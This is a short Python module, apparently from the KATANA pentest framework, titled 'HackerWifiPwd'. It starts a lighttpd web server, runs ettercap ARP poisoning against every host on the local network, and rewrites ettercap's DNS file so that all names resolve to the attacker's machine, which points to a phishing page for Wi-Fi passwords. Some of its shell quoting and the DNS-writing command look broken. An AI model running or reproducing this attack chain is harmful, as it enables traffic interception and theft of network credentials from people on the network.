# KATANA
# HackerWifiPwd
# Script by RedToor
# 12/05/2015
from core import help
import subprocess
W  = '\033[0m'  
R  = '\033[31m' 
G  = '\033[32m' 
O  = '\033[33m' 
B  = '\033[34m' 
P  = '\033[35m' 
C  = '\033[36m' 
GR = '\033[37m'
def  hackerwifipwd():
	path="/files/hackerwifipwd"
	subprocess.call('lighttpd -f "'+path+'/lighttpd.cfg"', shell=True)
	subprocess.call('xterm -title "ARP Poisoning" -fg blue -e "ettercap -TM arp:remote // // -i $(ip route show|grep '/'src '/'| cut -d' ' -f3) -P autoadd" & ETTER_1=$!', shell=True)
	subprocess.call("* A $(ip route show|grep ' src '|cut -d' ' -f12) >/etc/ettercap/etter.dns", shell=True)
	subprocess.call('xterm -title "DNS Spoofing" -fg blue -e "ettercap -Tq -i $(ip route show|grep '/'src '/'|cut -d' ' -f3) -P dns_spoof" & ETTER_2=$!', shell=True)